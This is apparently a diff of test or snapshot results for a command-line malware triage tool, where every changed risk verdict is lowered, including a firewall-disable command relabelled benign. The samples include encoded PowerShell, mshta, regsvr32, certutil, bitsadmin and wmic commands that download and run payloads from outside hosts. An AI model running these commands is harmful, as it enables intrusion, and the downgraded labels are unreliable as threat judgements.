@@ -64,9 +64,9 @@
             "T1027.010",
             "T1059.001"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 80,
-          "verdict_label": "Malicious"
+          "risk_level": "medium",
+          "risk_score_bucket": 60,
+          "verdict_label": "Suspicious"
         },
         "run2_snapshot": {
           "evidence_count": 3,
@@ -124,9 +124,9 @@
             "T1027.010",
             "T1059.001"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 80,
-          "verdict_label": "Malicious"
+          "risk_level": "medium",
+          "risk_score_bucket": 60,
+          "verdict_label": "Suspicious"
         },
         "upload_dedup_flipped": false
       },
@@ -182,9 +182,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 76,
-              "verdict": "Malicious"
+              "level": "medium",
+              "score": 60,
+              "verdict": "Suspicious"
             },
             "ti_hits": [],
             "yara": [
@@ -214,7 +214,7 @@
               }
             ]
           },
-          "elapsed_ms": 158.6,
+          "elapsed_ms": 195.7,
           "status": 200
         },
         "die": {
@@ -522,7 +522,7 @@
               ]
             }
           },
-          "elapsed_ms": 150.7,
+          "elapsed_ms": 112.1,
           "status": 200
         },
         "narrate": {
@@ -537,7 +537,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 109.0,
+          "elapsed_ms": 129.2,
           "status": 200
         },
         "upload": {
@@ -565,7 +565,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 197.9,
+          "elapsed_ms": 131.4,
           "status": 200
         }
       },
@@ -621,9 +621,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 76,
-              "verdict": "Malicious"
+              "level": "medium",
+              "score": 60,
+              "verdict": "Suspicious"
             },
             "ti_hits": [],
             "yara": [
@@ -653,7 +653,7 @@
               }
             ]
           },
-          "elapsed_ms": 156.7,
+          "elapsed_ms": 205.7,
           "status": 200
         },
         "die": {
@@ -961,7 +961,7 @@
               ]
             }
           },
-          "elapsed_ms": 150.5,
+          "elapsed_ms": 165.2,
           "status": 200
         },
         "narrate": {
@@ -976,7 +976,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 94.6,
+          "elapsed_ms": 144.1,
           "status": 200
         },
         "upload": {
@@ -1004,7 +1004,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 140.7,
+          "elapsed_ms": 148.6,
           "status": 200
         }
       }
@@ -1060,9 +1060,9 @@
             "T1218.005",
             "T1566.001"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 100,
-          "verdict_label": "Malicious"
+          "risk_level": "medium",
+          "risk_score_bucket": 50,
+          "verdict_label": "Suspicious"
         },
         "run2_snapshot": {
           "evidence_count": 0,
@@ -1108,9 +1108,9 @@
             "T1218.005",
             "T1566.001"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 100,
-          "verdict_label": "Malicious"
+          "risk_level": "medium",
+          "risk_score_bucket": 50,
+          "verdict_label": "Suspicious"
         },
         "upload_dedup_flipped": false
       },
@@ -1164,9 +1164,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 100,
-              "verdict": "Malicious"
+              "level": "medium",
+              "score": 49,
+              "verdict": "Suspicious"
             },
             "ti_hits": [],
             "yara": [
@@ -1184,7 +1184,7 @@
               }
             ]
           },
-          "elapsed_ms": 8311.8,
+          "elapsed_ms": 1445.9,
           "status": 200
         },
         "die": {
@@ -1369,7 +1369,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 99.6,
+          "elapsed_ms": 172.0,
           "status": 200
         },
         "narrate": {
@@ -1384,7 +1384,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 101.6,
+          "elapsed_ms": 120.5,
           "status": 200
         },
         "upload": {
@@ -1412,7 +1412,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 115.9,
+          "elapsed_ms": 134.4,
           "status": 200
         }
       },
@@ -1466,9 +1466,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 100,
-              "verdict": "Malicious"
+              "level": "medium",
+              "score": 49,
+              "verdict": "Suspicious"
             },
             "ti_hits": [],
             "yara": [
@@ -1486,7 +1486,7 @@
               }
             ]
           },
-          "elapsed_ms": 1335.4,
+          "elapsed_ms": 4163.3,
           "status": 200
         },
         "die": {
@@ -1671,7 +1671,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 100.7,
+          "elapsed_ms": 127.4,
           "status": 200
         },
         "narrate": {
@@ -1686,7 +1686,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 109.5,
+          "elapsed_ms": 144.8,
           "status": 200
         },
         "upload": {
@@ -1714,7 +1714,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 196.4,
+          "elapsed_ms": 141.8,
           "status": 200
         }
       }
@@ -1778,9 +1778,9 @@
           "mitre_ids": [
             "T1105"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 70,
-          "verdict_label": "Malicious"
+          "risk_level": "low",
+          "risk_score_bucket": 20,
+          "verdict_label": "Low Risk"
         },
         "run2_snapshot": {
           "evidence_count": 1,
@@ -1834,9 +1834,9 @@
           "mitre_ids": [
             "T1105"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 70,
-          "verdict_label": "Malicious"
+          "risk_level": "low",
+          "risk_score_bucket": 20,
+          "verdict_label": "Low Risk"
         },
         "upload_dedup_flipped": false
       },
@@ -1905,9 +1905,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 73,
-              "verdict": "Malicious"
+              "level": "low",
+              "score": 19,
+              "verdict": "Low Risk"
             },
             "ti_hits": [],
             "yara": [
@@ -1919,7 +1919,7 @@
               }
             ]
           },
-          "elapsed_ms": 1357.5,
+          "elapsed_ms": 8322.8,
           "status": 200
         },
         "die": {
@@ -2139,7 +2139,7 @@
               ]
             }
           },
-          "elapsed_ms": 110.6,
+          "elapsed_ms": 128.3,
           "status": 200
         },
         "narrate": {
@@ -2178,7 +2178,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 103.4,
+          "elapsed_ms": 128.7,
           "status": 200
         },
         "upload": {
@@ -2206,7 +2206,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 114.7,
+          "elapsed_ms": 215.2,
           "status": 200
         }
       },
@@ -2275,9 +2275,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 73,
-              "verdict": "Malicious"
+              "level": "low",
+              "score": 19,
+              "verdict": "Low Risk"
             },
             "ti_hits": [],
             "yara": [
@@ -2289,7 +2289,7 @@
               }
             ]
           },
-          "elapsed_ms": 1065.6,
+          "elapsed_ms": 3395.7,
           "status": 200
         },
         "die": {
@@ -2509,7 +2509,7 @@
               ]
             }
           },
-          "elapsed_ms": 202.8,
+          "elapsed_ms": 140.2,
           "status": 200
         },
         "narrate": {
@@ -2548,7 +2548,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 204.8,
+          "elapsed_ms": 115.6,
           "status": 200
         },
         "upload": {
@@ -2576,7 +2576,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 104.9,
+          "elapsed_ms": 177.2,
           "status": 200
         }
       }
@@ -2633,9 +2633,9 @@
             "T1105",
             "T1218.010"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 100,
-          "verdict_label": "Malicious"
+          "risk_level": "low",
+          "risk_score_bucket": 20,
+          "verdict_label": "Low Risk"
         },
         "run2_snapshot": {
           "evidence_count": 0,
@@ -2682,9 +2682,9 @@
             "T1105",
             "T1218.010"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 100,
-          "verdict_label": "Malicious"
+          "risk_level": "low",
+          "risk_score_bucket": 20,
+          "verdict_label": "Low Risk"
         },
         "upload_dedup_flipped": false
       },
@@ -2751,9 +2751,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 96,
-              "verdict": "Malicious"
+              "level": "low",
+              "score": 24,
+              "verdict": "Low Risk"
             },
             "ti_hits": [],
             "yara": [
@@ -2765,7 +2765,7 @@
               }
             ]
           },
-          "elapsed_ms": 1635.1,
+          "elapsed_ms": 3585.9,
           "status": 200
         },
         "die": {
@@ -3017,7 +3017,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 101.7,
+          "elapsed_ms": 131.9,
           "status": 200
         },
         "narrate": {
@@ -3056,7 +3056,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 141.7,
+          "elapsed_ms": 134.1,
           "status": 200
         },
         "upload": {
@@ -3084,7 +3084,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 130.8,
+          "elapsed_ms": 157.6,
           "status": 200
         }
       },
@@ -3151,9 +3151,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 96,
-              "verdict": "Malicious"
+              "level": "low",
+              "score": 24,
+              "verdict": "Low Risk"
             },
             "ti_hits": [],
             "yara": [
@@ -3165,7 +3165,7 @@
               }
             ]
           },
-          "elapsed_ms": 1103.3,
+          "elapsed_ms": 1142.1,
           "status": 200
         },
         "die": {
@@ -3417,7 +3417,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 127.5,
+          "elapsed_ms": 136.7,
           "status": 200
         },
         "narrate": {
@@ -3456,7 +3456,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 103.2,
+          "elapsed_ms": 133.8,
           "status": 200
         },
         "upload": {
@@ -3484,7 +3484,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 139.8,
+          "elapsed_ms": 170.6,
           "status": 200
         }
       }
@@ -3762,7 +3762,7 @@
               }
             ]
           },
-          "elapsed_ms": 1657.1,
+          "elapsed_ms": 8270.6,
           "status": 200
         },
         "die": {
@@ -4167,7 +4167,7 @@
               ]
             }
           },
-          "elapsed_ms": 150.2,
+          "elapsed_ms": 168.4,
           "status": 200
         },
         "narrate": {
@@ -4206,7 +4206,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 120.0,
+          "elapsed_ms": 143.2,
           "status": 200
         },
         "upload": {
@@ -4234,7 +4234,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 131.2,
+          "elapsed_ms": 140.6,
           "status": 200
         }
       },
@@ -4364,7 +4364,7 @@
               }
             ]
           },
-          "elapsed_ms": 961.4,
+          "elapsed_ms": 1053.8,
           "status": 200
         },
         "die": {
@@ -4769,7 +4769,7 @@
               ]
             }
           },
-          "elapsed_ms": 122.9,
+          "elapsed_ms": 152.0,
           "status": 200
         },
         "narrate": {
@@ -4808,7 +4808,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 109.8,
+          "elapsed_ms": 136.5,
           "status": 200
         },
         "upload": {
@@ -4836,7 +4836,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 132.7,
+          "elapsed_ms": 250.1,
           "status": 200
         }
       }
@@ -4958,7 +4958,7 @@
               }
             ]
           },
-          "elapsed_ms": 175.2,
+          "elapsed_ms": 206.1,
           "status": 200
         },
         "die": {
@@ -4975,7 +4975,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 107.3,
+          "elapsed_ms": 118.1,
           "status": 200
         },
         "narrate": {
@@ -4990,7 +4990,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 102.1,
+          "elapsed_ms": 121.8,
           "status": 200
         },
         "upload": {
@@ -5018,7 +5018,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 108.6,
+          "elapsed_ms": 136.4,
           "status": 200
         }
       },
@@ -5062,7 +5062,7 @@
               }
             ]
           },
-          "elapsed_ms": 169.7,
+          "elapsed_ms": 180.5,
           "status": 200
         },
         "die": {
@@ -5079,7 +5079,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 103.2,
+          "elapsed_ms": 135.3,
           "status": 200
         },
         "narrate": {
@@ -5094,7 +5094,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 97.0,
+          "elapsed_ms": 117.2,
           "status": 200
         },
         "upload": {
@@ -5122,7 +5122,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 119.5,
+          "elapsed_ms": 136.1,
           "status": 200
         }
       }
@@ -5168,9 +5168,9 @@
           "mitre_ids": [
             "T1562.004"
           ],
-          "risk_level": "low",
-          "risk_score_bucket": 20,
-          "verdict_label": "Low Risk"
+          "risk_level": "safe",
+          "risk_score_bucket": 10,
+          "verdict_label": "Benign"
         },
         "run2_snapshot": {
           "evidence_count": 0,
@@ -5206,9 +5206,9 @@
           "mitre_ids": [
             "T1562.004"
           ],
-          "risk_level": "low",
-          "risk_score_bucket": 20,
-          "verdict_label": "Low Risk"
+          "risk_level": "safe",
+          "risk_score_bucket": 10,
+          "verdict_label": "Benign"
         },
         "upload_dedup_flipped": false
       },
@@ -5254,9 +5254,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "low",
-              "score": 17,
-              "verdict": "Low Risk"
+              "level": "safe",
+              "score": 9,
+              "verdict": "Benign"
             },
             "ti_hits": [],
             "yara": [
@@ -5268,7 +5268,7 @@
               }
             ]
           },
-          "elapsed_ms": 153.5,
+          "elapsed_ms": 187.1,
           "status": 200
         },
         "die": {
@@ -5348,7 +5348,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 111.5,
+          "elapsed_ms": 140.4,
           "status": 200
         },
         "narrate": {
@@ -5363,7 +5363,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 101.9,
+          "elapsed_ms": 137.6,
           "status": 200
         },
         "upload": {
@@ -5391,7 +5391,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 104.8,
+          "elapsed_ms": 130.1,
           "status": 200
         }
       },
@@ -5437,9 +5437,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "low",
-              "score": 17,
-              "verdict": "Low Risk"
+              "level": "safe",
+              "score": 9,
+              "verdict": "Benign"
             },
             "ti_hits": [],
             "yara": [
@@ -5451,7 +5451,7 @@
               }
             ]
           },
-          "elapsed_ms": 162.8,
+          "elapsed_ms": 210.8,
           "status": 200
         },
         "die": {
@@ -5531,7 +5531,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 94.6,
+          "elapsed_ms": 123.6,
           "status": 200
         },
         "narrate": {
@@ -5546,7 +5546,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 98.0,
+          "elapsed_ms": 122.8,
           "status": 200
         },
         "upload": {
@@ -5574,7 +5574,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 108.1,
+          "elapsed_ms": 125.8,
           "status": 200
         }
       }
@@ -5638,9 +5638,9 @@
             "T1059.001",
             "T1140"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 80,
-          "verdict_label": "Malicious"
+          "risk_level": "medium",
+          "risk_score_bucket": 60,
+          "verdict_label": "Suspicious"
         },
         "run2_snapshot": {
           "evidence_count": 3,
@@ -5694,9 +5694,9 @@
             "T1059.001",
             "T1140"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 80,
-          "verdict_label": "Malicious"
+          "risk_level": "medium",
+          "risk_score_bucket": 60,
+          "verdict_label": "Suspicious"
         },
         "upload_dedup_flipped": false
       },
@@ -5752,9 +5752,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 84,
-              "verdict": "Malicious"
+              "level": "medium",
+              "score": 60,
+              "verdict": "Suspicious"
             },
             "ti_hits": [],
             "yara": [
@@ -5784,7 +5784,7 @@
               }
             ]
           },
-          "elapsed_ms": 167.7,
+          "elapsed_ms": 168.3,
           "status": 200
         },
         "die": {
@@ -6050,7 +6050,7 @@
               ]
             }
           },
-          "elapsed_ms": 109.3,
+          "elapsed_ms": 144.4,
           "status": 200
         },
         "narrate": {
@@ -6089,7 +6089,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 97.5,
+          "elapsed_ms": 138.3,
           "status": 200
         },
         "upload": {
@@ -6117,7 +6117,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 104.0,
+          "elapsed_ms": 134.0,
           "status": 200
         }
       },
@@ -6173,9 +6173,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 84,
-              "verdict": "Malicious"
+              "level": "medium",
+              "score": 60,
+              "verdict": "Suspicious"
             },
             "ti_hits": [],
             "yara": [
@@ -6205,7 +6205,7 @@
               }
             ]
           },
-          "elapsed_ms": 168.6,
+          "elapsed_ms": 207.6,
           "status": 200
         },
         "die": {
@@ -6471,7 +6471,7 @@
               ]
             }
           },
-          "elapsed_ms": 99.1,
+          "elapsed_ms": 123.0,
           "status": 200
         },
         "narrate": {
@@ -6510,7 +6510,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 144.0,
+          "elapsed_ms": 226.8,
           "status": 200
         },
         "upload": {
@@ -6538,7 +6538,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 120.1,
+          "elapsed_ms": 144.9,
           "status": 200
         }
       }
@@ -6643,7 +6643,7 @@
             "ti_hits": [],
             "yara": []
           },
-          "elapsed_ms": 144.0,
+          "elapsed_ms": 181.1,
           "status": 200
         },
         "die": {
@@ -6660,7 +6660,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 102.2,
+          "elapsed_ms": 130.3,
           "status": 200
         },
         "narrate": {
@@ -6675,7 +6675,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 93.8,
+          "elapsed_ms": 131.5,
           "status": 200
         },
         "upload": {
@@ -6701,7 +6701,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 104.6,
+          "elapsed_ms": 208.0,
           "status": 200
         }
       },
@@ -6732,7 +6732,7 @@
             "ti_hits": [],
             "yara": []
           },
-          "elapsed_ms": 209.1,
+          "elapsed_ms": 194.0,
           "status": 200
         },
         "die": {
@@ -6749,7 +6749,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 103.4,
+          "elapsed_ms": 135.4,
           "status": 200
         },
         "narrate": {
@@ -6764,7 +6764,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 101.0,
+          "elapsed_ms": 179.3,
           "status": 200
         },
         "upload": {
@@ -6790,7 +6790,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 106.3,
+          "elapsed_ms": 133.1,
           "status": 200
         }
       }
@@ -6869,7 +6869,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 127.1,
+          "elapsed_ms": 189.3,
           "status": 200
         },
         "narrate": {
@@ -6899,7 +6899,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 106.3,
+          "elapsed_ms": 167.0,
           "status": 200
         }
       },
@@ -6922,7 +6922,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 112.2,
+          "elapsed_ms": 129.5,
           "status": 200
         },
         "narrate": {
@@ -6952,7 +6952,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 118.9,
+          "elapsed_ms": 139.8,
           "status": 200
         }
       }
@@ -7015,9 +7015,9 @@
             "T1105",
             "T1197"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 80,
-          "verdict_label": "Malicious"
+          "risk_level": "low",
+          "risk_score_bucket": 30,
+          "verdict_label": "Low Risk"
         },
         "run2_snapshot": {
           "evidence_count": 1,
@@ -7070,9 +7070,9 @@
             "T1105",
             "T1197"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 80,
-          "verdict_label": "Malicious"
+          "risk_level": "low",
+          "risk_score_bucket": 30,
+          "verdict_label": "Low Risk"
         },
         "upload_dedup_flipped": false
       },
@@ -7132,9 +7132,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 83,
-              "verdict": "Malicious"
+              "level": "low",
+              "score": 29,
+              "verdict": "Low Risk"
             },
             "ti_hits": [],
             "yara": [
@@ -7146,7 +7146,7 @@
               }
             ]
           },
-          "elapsed_ms": 879.2,
+          "elapsed_ms": 4725.2,
           "status": 200
         },
         "die": {
@@ -7364,7 +7364,7 @@
               ]
             }
           },
-          "elapsed_ms": 102.1,
+          "elapsed_ms": 128.6,
           "status": 200
         },
         "narrate": {
@@ -7403,7 +7403,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 100.8,
+          "elapsed_ms": 121.4,
           "status": 200
         },
         "upload": {
@@ -7431,7 +7431,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 108.7,
+          "elapsed_ms": 178.8,
           "status": 200
         }
       },
@@ -7491,9 +7491,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 83,
-              "verdict": "Malicious"
+              "level": "low",
+              "score": 29,
+              "verdict": "Low Risk"
             },
             "ti_hits": [],
             "yara": [
@@ -7505,7 +7505,7 @@
               }
             ]
           },
-          "elapsed_ms": 1082.4,
+          "elapsed_ms": 8301.8,
           "status": 200
         },
         "die": {
@@ -7723,7 +7723,7 @@
               ]
             }
           },
-          "elapsed_ms": 111.3,
+          "elapsed_ms": 129.1,
           "status": 200
         },
         "narrate": {
@@ -7762,7 +7762,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 97.7,
+          "elapsed_ms": 180.1,
           "status": 200
         },
         "upload": {
@@ -7790,7 +7790,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 109.7,
+          "elapsed_ms": 170.6,
           "status": 200
         }
       }
@@ -7851,9 +7851,9 @@
             "T1218.005",
             "T1218.011"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 80,
-          "verdict_label": "Malicious"
+          "risk_level": "medium",
+          "risk_score_bucket": 40,
+          "verdict_label": "Suspicious"
         },
         "run2_snapshot": {
           "evidence_count": 3,
@@ -7904,9 +7904,9 @@
             "T1218.005",
             "T1218.011"
           ],
-          "risk_level": "high",
-          "risk_score_bucket": 80,
-          "verdict_label": "Malicious"
+          "risk_level": "medium",
+          "risk_score_bucket": 40,
+          "verdict_label": "Suspicious"
         },
         "upload_dedup_flipped": false
       },
@@ -7961,9 +7961,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 78,
-              "verdict": "Malicious"
+              "level": "medium",
+              "score": 44,
+              "verdict": "Suspicious"
             },
             "ti_hits": [],
             "yara": [
@@ -7981,7 +7981,7 @@
               }
             ]
           },
-          "elapsed_ms": 163.2,
+          "elapsed_ms": 169.0,
           "status": 200
         },
         "die": {
@@ -8416,7 +8416,7 @@
               ]
             }
           },
-          "elapsed_ms": 98.0,
+          "elapsed_ms": 142.3,
           "status": 200
         },
         "narrate": {
@@ -8431,7 +8431,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 95.8,
+          "elapsed_ms": 134.4,
           "status": 200
         },
         "upload": {
@@ -8459,7 +8459,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 167.1,
+          "elapsed_ms": 170.6,
           "status": 200
         }
       },
@@ -8514,9 +8514,9 @@
             ],
             "osint": null,
             "risk": {
-              "level": "high",
-              "score": 78,
-              "verdict": "Malicious"
+              "level": "medium",
+              "score": 44,
+              "verdict": "Suspicious"
             },
             "ti_hits": [],
             "yara": [
@@ -8534,7 +8534,7 @@
               }
             ]
           },
-          "elapsed_ms": 164.6,
+          "elapsed_ms": 179.5,
           "status": 200
         },
         "die": {
@@ -8969,7 +8969,7 @@
               ]
             }
           },
-          "elapsed_ms": 107.7,
+          "elapsed_ms": 138.2,
           "status": 200
         },
         "narrate": {
@@ -8984,7 +8984,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 106.1,
+          "elapsed_ms": 139.9,
           "status": 200
         },
         "upload": {
@@ -9012,7 +9012,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 109.9,
+          "elapsed_ms": 142.7,
           "status": 200
         }
       }
